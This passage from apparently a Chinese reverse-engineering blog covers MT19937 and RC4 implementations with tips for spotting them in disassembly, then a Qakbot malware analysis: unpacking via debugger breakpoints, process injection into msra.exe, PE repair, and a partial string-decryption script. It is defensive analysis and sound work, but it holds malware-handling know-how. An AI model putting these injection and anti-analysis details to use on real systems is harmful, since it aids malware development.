SHA1_HPP */</span></span><br></code></pre></td></tr></table></figure><h3 id="1-1-4-逆向特征"><a href="#1-1-4-逆向特征" class="headerlink" title="1.1.4 逆向特征"></a>1.1.4 逆向特征</h3><ul><li>可以根据H的初始值来确定</li><li>可以根据位运算特征来确定</li></ul><h1 id="2-随机数算法"><a href="#2-随机数算法" class="headerlink" title="2.随机数算法"></a>2.随机数算法</h1><h2 id="2-1-Mersenne-Twister"><a href="#2-1-Mersenne-Twister" class="headerlink" title="2.1 Mersenne Twister"></a>2.1 Mersenne Twister</h2><h3 id="2-1-1-特点"><a href="#2-1-1-特点" class="headerlink" title="2.1.1 特点"></a>2.1.1 特点</h3><ul><li><p>基于位运算的伪随机数生成算法</p></li><li><p>使用随机数种子</p></li><li><p>需要一个初始状态</p></li><li><p>每生成一个随机数会转换一次状态</p></li><li><p>下一个随机数生成需要使用上一个状态</p></li></ul><h3 id="2-1-2-原理"><a href="#2-1-2-原理" class="headerlink" title="2.1.2 原理"></a>2.1.2 原理</h3><p><img src="/2022/10/10/crypto-basic/20171128183440350.png" alt="MT算法原理图"></p><p><strong>分三个阶段：</strong></p><ol><li>初始化，获得基础的梅森旋转链</li><li>对旋转链进行旋转算法（状态传递）</li><li>对旋转算法的结果进行处理（生成随机数）</li></ol><h3 id="2-1-3-实现"><a href="#2-1-3-实现" class="headerlink" title="2.1.3 实现"></a>2.1.3 实现</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-comment">// 定义MT19937-32的常数</span><br><span class="hljs-keyword">enum</span><br>&#123;<br><span class="hljs-comment">// 假定 W = 32 (此项省略)</span><br>N = <span class="hljs-number">624</span>,<br>M = <span class="hljs-number">397</span>,<br>R = <span class="hljs-number">31</span>,<br>A = <span class="hljs-number">0x9908B0DF</span>,<br><br>F = <span class="hljs-number">1812433253</span>,<br><br>U = <span class="hljs-number">11</span>,<br><span class="hljs-comment">// 假定 D = 0xFFFFFFFF (此项省略)</span><br><br>S = <span class="hljs-number">7</span>,<br>B = <span class="hljs-number">0x9D2C5680</span>,<br><br>T = <span class="hljs-number">15</span>,<br>C = <span class="hljs-number">0xEFC60000</span>,<br><br>L = <span class="hljs-number">18</span>,<br><br>MASK_LOWER = (<span class="hljs-number">1ull</span> &lt;&lt; R) - <span class="hljs-number">1</span>,<br>MASK_UPPER = (<span class="hljs-number">1ull</span> &lt;&lt; R)<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span>  mt[N];<br><span class="hljs-type">static</span> <span class="hljs-type">uint16_t</span>  index;<br><br><span class="hljs-comment">// 根据给定的seed初始化旋转链</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Initialize</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">uint32_t</span>  seed)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">uint32_t</span>  i;<br>mt[<span class="hljs-number">0</span>] = seed;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; N; i++)<br>&#123;<br>mt[i] = (F * (mt[i - <span class="hljs-number">1</span>] ^ (mt[i - <span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">30</span>)) + i);<br>&#125;<br>index = N;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">Twist</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">uint32_t</span>  i, x, xA;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; N; i++)<br>&#123;<br>x = (mt[i] &amp; MASK_UPPER) + (mt[(i + <span class="hljs-number">1</span>) % N] &amp; MASK_LOWER);<br>xA = x &gt;&gt; <span class="hljs-number">1</span>;<br><span class="hljs-keyword">if</span> (x &amp; <span class="hljs-number">0x1</span>)<br>&#123;<br>xA ^= A;<br>&#125;<br>mt[i] = mt[(i + M) % N] ^ xA;<br>&#125;<br><br>index = <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">// 产生一个32位随机数</span><br><span class="hljs-function"><span class="hljs-type">uint32_t</span> <span class="hljs-title">ExtractU32</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">uint32_t</span>  y;<br><span class="hljs-type">int</span>       i = index;<br><span class="hljs-keyword">if</span> (index &gt;= N)<br>&#123;<br><span class="hljs-built_in">Twist</span>();<br>i = index;<br>&#125;<br>y = mt[i];<br>index = i + <span class="hljs-number">1</span>;<br>y ^= (y &gt;&gt; U);<br>y ^= (y &lt;&lt; S) &amp; B;<br>y ^= (y &lt;&lt; T) &amp; C;<br>y ^= (y &gt;&gt; L);<br><span class="hljs-keyword">return</span> y;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">Initialize</span>(<span class="hljs-number">234</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;random: %d\n&quot;</span>, <span class="hljs-built_in">ExtractU32</span>());<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-1-4-逆向特征"><a href="#2-1-4-逆向特征" class="headerlink" title="2.1.4 逆向特征"></a>2.1.4 逆向特征</h3><p>初始化函数：</p><p><img src="/2022/10/10/crypto-basic/image-20221012160711704.png" alt="MT初始化"></p><p>旋转函数：</p><p><img src="/2022/10/10/crypto-basic/image-20221012160735764.png" alt="MT旋转"></p><p><img src="/2022/10/10/crypto-basic/image-20221012160928764.png" alt="mt生成随机数"></p><h1 id="3-对称加密算法"><a href="#3-对称加密算法" class="headerlink" title="3.对称加密算法"></a>3.对称加密算法</h1><h2 id="3-1-RC4算法"><a href="#3-1-RC4算法" class="headerlink" title="3.1 RC4算法"></a>3.1 RC4算法</h2><h3 id="3-1-1-特点"><a href="#3-1-1-特点" class="headerlink" title="3.1.1 特点"></a>3.1.1 特点</h3><ul><li>对称加密</li><li>key长度1-256字节</li><li>使用KSA生成S盒，使用PRGA生成密钥流</li><li>S盒为256字节的数组</li></ul><h3 id="3-1-2-原理"><a href="#3-1-2-原理" class="headerlink" title="3.1.2 原理"></a>3.1.2 原理</h3><h4 id="3-1-2-1-原理图"><a href="#3-1-2-1-原理图" class="headerlink" title="3.1.2.1 原理图"></a>3.1.2.1 原理图</h4><p><img src="/2022/10/10/crypto-basic/image-20221010215125686.png" alt="RC4原理图"></p><h4 id="3-1-2-2-KSA"><a href="#3-1-2-2-KSA" class="headerlink" title="3.1.2.2 KSA"></a>3.1.2.2 KSA</h4><p>The key-scheduling algorithm算法，用于根据key来生成S盒。</p><p>首先初始化长度为256的数组，第一个for循环将0-255的互补重复的元素装入S盒，第二个for循环根据密钥打乱S盒，伪代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">from</span> <span class="hljs-number">0</span> to <span class="hljs-number">255</span><br>    S[i] := i<br>endfor<br>j := <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">from</span> <span class="hljs-number">0</span> to <span class="hljs-number">255</span><br>    j := (j + S[i] + key[i mod keylength]) mod <span class="hljs-number">256</span><br>    swap values of S[i] <span class="hljs-keyword">and</span> S[j]<br>endfor<br></code></pre></td></tr></table></figure><h4 id="3-1-2-3-PRGA"><a href="#3-1-2-3-PRGA" class="headerlink" title="3.1.2.3 PRGA"></a>3.1.2.3 PRGA</h4><p>The pseudo-random generation algorithm算法，用于根据S盒生成与明文长度相同的密钥流，使用密钥加密明文，伪代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">i := <span class="hljs-number">0</span><br>j := <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> GeneratingOutput:<br>    i := (i + <span class="hljs-number">1</span>) mod <span class="hljs-number">256</span><br>    j := (j + S[i]) mod <span class="hljs-number">256</span><br>    swap values of S[i] <span class="hljs-keyword">and</span> S[j]<br>    K := S[(S[i] + S[j]) mod <span class="hljs-number">256</span>]<br>    output K<br>endwhile<br></code></pre></td></tr></table></figure><p>其中3行是以明文长度范围内的循环，4、5行用于定位S盒中的元素，6行在不断的交换S盒的元素，7行在生成密钥流。示意图如下：</p><p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e9/RC4.svg/1920px-RC4.svg.png" alt="密钥生成示意图"></p><h3 id="3-1-3-代码实现"><a href="#3-1-3-代码实现" class="headerlink" title="3.1.3 代码实现"></a>3.1.3 代码实现</h3><h4 id="3-1-3-1-KSA实现"><a href="#3-1-3-1-KSA实现" class="headerlink" title="3.1.3.1 KSA实现"></a>3.1.3.1 KSA实现</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">KSA</span><span class="hljs-params">(<span class="hljs-type">char</span>* key, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* s_box)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">memset</span>(s_box, <span class="hljs-number">0</span>, <span class="hljs-number">256</span>);<br><span class="hljs-type">int</span> j = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++)<br>s_box[i] = i;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++)<br>&#123;<br>j = (j + s_box[i] + key[i % <span class="hljs-built_in">strlen</span>(key)]) % <span class="hljs-number">256</span>;<br><span class="hljs-built_in">swap</span>(&amp;s_box[i], &amp;s_box[j]);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="3-1-3-2-PRGA实现"><a href="#3-1-3-2-PRGA实现" class="headerlink" title="3.1.3.2 PRGA实现"></a>3.1.3.2 PRGA实现</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PRGA</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* s_box, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* data, <span class="hljs-type">int</span> data_size)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>, index = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span> (data_size)<br>&#123;<br>i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>;<br>j = (j + s_box[i]) % <span class="hljs-number">256</span>;<br><span class="hljs-built_in">swap</span>(&amp;s_box[i], &amp;s_box[j]);<br>data[index] = s_box[(s_box[i] + s_box[j]) % <span class="hljs-number">256</span>];<br>index++;<br>data_size--;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="3-1-3-3-异或加密"><a href="#3-1-3-3-异或加密" class="headerlink" title="3.1.3.3 异或加密"></a>3.1.3.3 异或加密</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">encode</span><span class="hljs-params">(<span class="hljs-type">char</span>* key, <span class="hljs-type">char</span>* data)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> s_box[<span class="hljs-number">256</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-built_in">KSA</span>(key, s_box);<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* key_stream = <span class="hljs-keyword">new</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>[<span class="hljs-built_in">strlen</span>(data)];<br><span class="hljs-keyword">if</span> (!key_stream) <br><span class="hljs-keyword">return</span>;<br><span class="hljs-built_in">PRGA</span>(s_box, key_stream, <span class="hljs-built_in">strlen</span>(data));<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(data); i++)<br>&#123;<br>data[i] ^= key_stream[i];<br>&#125;<br><span class="hljs-keyword">if</span> (key_stream)<br>&#123;<br><span class="hljs-keyword">delete</span>[] key_stream;<br>key_stream = <span class="hljs-literal">NULL</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="3-1-3-4-运行结果"><a href="#3-1-3-4-运行结果" class="headerlink" title="3.1.3.4 运行结果"></a>3.1.3.4 运行结果</h4><p><img src="/2022/10/10/crypto-basic/image-20221010224018062.png" alt="rc4运行结果"></p><h3 id="3-1-4-逆向特征"><a href="#3-1-4-逆向特征" class="headerlink" title="3.1.4 逆向特征"></a>3.1.4 逆向特征</h3><p>初始化256字节的数组，以及打乱数组元素，可以认为是产生s_box的KSA函数。如下图所示：</p><p><img src="/2022/10/10/crypto-basic/image-20221010224643119.png" alt="rc4_KSA函数"></p><p>定位到s_box再定位PRGA函数会容易的多，如下图所示：</p><p><img src="/2022/10/10/crypto-basic/image-20221010225103811.png" alt="rc4_PRGA函数"></p><p>加密函数如下：</p><p><img src="/2022/10/10/crypto-basic/image-20221010225302532.png" alt="rc4_encode"></p>]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> basic </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Malware Analysis Qakbot分析</title>
      <link href="/2022/10/07/malware-analysis-qakbot-fen-xi/"/>
      <url>/2022/10/07/malware-analysis-qakbot-fen-xi/</url>
      
        <content type="html"><![CDATA[<h2 id="0-分析目标"><a href="#0-分析目标" class="headerlink" title="0.分析目标"></a>0.分析目标</h2><ul><li>恶意程序是否加壳？如果是，是常见的壳还是自写壳？</li><li>恶意程序使用什么网络通信手段？Winsock2、Wininet、COM、WSK甚至是自己实现的？</li><li>是否存在注入或者HOOK技术？如果存在，是什么？</li><li>是否存在对抗？反调试、反静态分析、反虚拟机？</li><li>是否存在API&#x2F;DLL被加密？</li><li>是否存在字符串加密或混淆？</li><li>恶意程序使用了什么同步原语？</li><li>恶意程序使用了什么加密算法？</li><li>恶意程序使用了什么持久化手段？</li><li>是否存在ShellCode被注入进系统进程？</li><li>是否存在文件过滤驱动被安装？</li><li>如果安装了驱动，是否存在回调或者定时器？</li></ul><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>BAZAAR 报告：</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221009101253136.png" alt="BAZARR 数据库报告"></p><p>TRIAGE报告：</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221009102005149.png" alt="TRIAGE报告1"></p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221009102123632.png" alt="TRIAGE报告2"></p><p>沙箱报告：</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221009102209063.png" alt="沙箱报告"></p><p>DIE检测：</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221009102320523.png" alt="DIE检测"></p><p>PE信息：</p><p>导入表信息</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221009103502909.png" alt="导入表信息1"></p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221009103544072.png" alt="导入表信息2"></p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221009103721047.png" alt="导入表信息3"></p><p>节表信息</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221009103808029.png" alt="节表信息"></p><p>导出表信息</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221009104114082.png" alt="导出表信息"></p><p><strong>总结：</strong></p><ul><li>样本来自qakbot家族，属于obama150僵尸网络。</li><li>有遍历进程以及读写其他进程的API被调用，可能存在注入。</li><li>可能是使用计划任务作为持久化。</li><li>可能将自己释放到temp目录下。</li><li>注入的目标进程可能是explorer.exe。</li><li>程序是由Borland Delphi编写的32位DLL。</li><li>导入表中未出现网络相关的API，可能被动态解析或者是加壳了。</li><li>存在不寻常的节区名。</li><li>存在一个导出函数，可以被用于动态调试。</li></ul><h2 id="2-脱壳"><a href="#2-脱壳" class="headerlink" title="2.脱壳"></a>2.脱壳</h2><p>调试参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-string">&quot;C:\Windows\SysWOW64\rundll32.exe&quot;</span> C:\Users\mas\Desktop\mal_lab\test2\mas_2.bin,<span class="hljs-comment">#1</span><br></code></pre></td></tr></table></figure><p>eip指向oep时，在如下API设置断点：</p><ul><li>VirtualAlloc( )ret 0x10&#x2F;&#x2F; 检测自注入</li><li>WriteProcessMemory( )                                    &#x2F;&#x2F; 根据上述信息，可能存在进程注入</li><li>NtResumeThread( )                                           &#x2F;&#x2F; 为了避免失去控制权</li></ul><p>设置好断点后，F9运行，每次断在VirtualAlloc返回位置时，将eax的值放入内存窗口中，按下F9观察内存中的内容。遇见异常按Shift + F9忽略继续执行。直到ResumeThread被断下时，此时会得到两个PE文件，如下：</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221009111509538.png" alt="PE1"></p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221009111612289.png" alt="PE2"></p><p>第一个PE文件的节名异常，可能还没有脱完，将第二个PE所在的内存区域保存到文件rundll32_02900000.bin。</p><p>Trige报告中显示，可能存在注入，动态跟一下，在以下API设置断点：（这里没设置MapViewOfSection断点的原因是经过测试，断不下，API被重写了）</p><ul><li>CreateProcessW( )</li><li>ResumeThread( )</li></ul><p>重新运行，断点断在CreateProcessW()，创建msra.exe系统进程。</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221009172558899.png" alt="CreateProcessW()"></p><p>执行到这里直接在ZwMapViewOfSection( )下断断不到想要的结果，这里采用动态跟踪的方式，向下追踪代码，可以得到如下调用ZwMapViewOfSection的方式：</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221009173724496.png" alt="调用ZwMapViewOfSectiond"></p><p>这里有个对抗技巧，根据eax + 0x14得到的地址根本不在ntdll中，而是在它释放的一个随即名dll中，相当于ntdll中的api被重写了一遍。</p><p>可以看见重写api列表如下：</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221009173933234.png" alt="重写的api列表"></p><p>函数地址来自a0f1f0bb.dll模块的.text段，这个模块就是上面得到那个第一个pe文件。</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221009174108804.png" alt="a0f1f0bb.dll"></p><p>步过这个函数，可以看见msra.exe被挂起创建，并且多了一个132kb的可执行共享内存，如下：</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221009174352387.png" alt="msra.exe"></p><p>映射内存可以直接由memcpy进行读写，这里不去追踪了，直接F9放行，断到ResumeThread( )函数位置：</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221009181025580.png" alt="ResumeThread"></p><p>此时使用ProcessHacker将即将执行的镜像内存dump下来，可以得知与之前dump文件是同一个pe的两种状态，如图所示：</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221009181413343.png" alt="010对比"></p><p><strong>手动修复PE：</strong></p><ul><li>将所有节表项的ra用va替换</li><li>计算相邻节表项之间的offset，用作rs和vs</li><li>将ImageBase修改为内存dump的起始位置</li></ul><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221010101332082.png" alt="手动修复后"></p><p><strong>工具修复PE：</strong></p><p>使用pe_unmapper修复一下内存中的dump，将其转换成未映射状态：</p><p><a href="https://github.com/hasherezade/libpeconv/tree/master/pe_unmapper">libpeconv&#x2F;pe_unmapper at master · hasherezade&#x2F;libpeconv (github.com)</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">// pe_unmapper.exe /in 输入文件 /base 映射基址 /out 输出文件<br>pe_unmapper.exe /in msra.exe_0x450000-0x21000.bin /base 00450000 /out msra.exe_0x450000-0x21000_fixed.bin<br></code></pre></td></tr></table></figure><p>转换后的pe文件导入表可以正常解析：</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221009183033236.png" alt="查看导入表"></p><h2 id="3-逆向"><a href="#3-逆向" class="headerlink" title="3.逆向"></a>3.逆向</h2><h3 id="3-0-IDA技巧"><a href="#3-0-IDA技巧" class="headerlink" title="3.0 IDA技巧"></a>3.0 IDA技巧</h3><ul><li>Ctrl + F5 反编译整个文件</li><li>Shift + F11 检查 mssdk_win7、ntapi_win7、ntddk_win7 是否存在，如果不存在，按INS添加。将vc32rtf添加到Shift + F5，分析驱动使用win10的库</li><li>运行 Flare Capa Explorer 和 FindCrypt 插件来收集信息</li><li>遇见申请大块堆内存，并且后续代码将该内存当数组处理的情况，可以创建大小一致结构体，将该堆内存空间指定为结构体类型，可以美化伪代码</li><li>多尝试使用枚举类型恢复API中的常量flag</li></ul><h3 id="3-1-自动化处理加密的字符串"><a href="#3-1-自动化处理加密的字符串" class="headerlink" title="3.1 自动化处理加密的字符串"></a>3.1 自动化处理加密的字符串</h3><h4 id="3-1-1-Python脚本模拟算法"><a href="#3-1-1-Python脚本模拟算法" class="headerlink" title="3.1.1 Python脚本模拟算法"></a>3.1.1 Python脚本模拟算法</h4><p>DllEntry向下不远处，会看到两个算法函数，如图所示：</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221011200241194.png" alt="DllEntry入口"></p><p>decode_string_table函数实现如下：</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221011200114085.png" alt="decode_string_table"></p><p>参数列表：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">j_decode_string_table</span>(加密字符串表长度, 全局加密字符串表，全局解密key，未使用，字符串表索引)<br></code></pre></td></tr></table></figure><p>j_decode_string_table函数实现如下：</p><p><img src="/2022/10/07/malware-analysis-qakbot-fen-xi/image-20221011200133636.png" alt="j_decode_string_table"></p><p>该函数会根据传入的索引来解密相应的字符串，并申请堆内存来保存结果，返回堆内存指针。</p><p>经过测试，decode_string_table_2函数与decode_string_table功能一致，只不过block和key的地址变换了。</p><p><strong>编写Python脚本模拟算法：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pydoc <span class="hljs-keyword">import</span> doc<br><span class="hljs-keyword">import</span> pefile<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypter</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>, data_string, data_key</span>):<br>    size = <span class="hljs-number">3660</span><br>    index = <span class="hljs-built_in">id</span><br>    index2 = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">if</span>( <span class="hljs-built_in">id</span> &lt; size ):<br>        flag = <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            <span class="hljs-keyword">if</span>(data_key[index % <span class="hljs-number">0x5A</span>] == data_string[index]):<br>                <span class="hljs-keyword">break</span><br>            index += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span>(index &gt;= size):<br>                flag = <span class="hljs-literal">True</span><br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span>(flag == <span class="hljs-literal">False</span>):<br>            index2 = index - <span class="hljs-built_in">id</span><br><br>    decopded_buf = <span class="hljs-string">&#x27;&#x27;</span><br>    index = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">if</span>(index2 != <span class="hljs-number">0</span>):<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            decopded_buf += <span class="hljs-built_in">chr</span>((data_string[<span class="hljs-built_in">id</span>]) ^ (data_key[<span class="hljs-built_in">id</span> % <span class="hljs-number">0x5A</span>]))<br>            <span class="hljs-built_in">id</span> += <span class="hljs-number">1</span><br>            index += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span>(index &gt;= 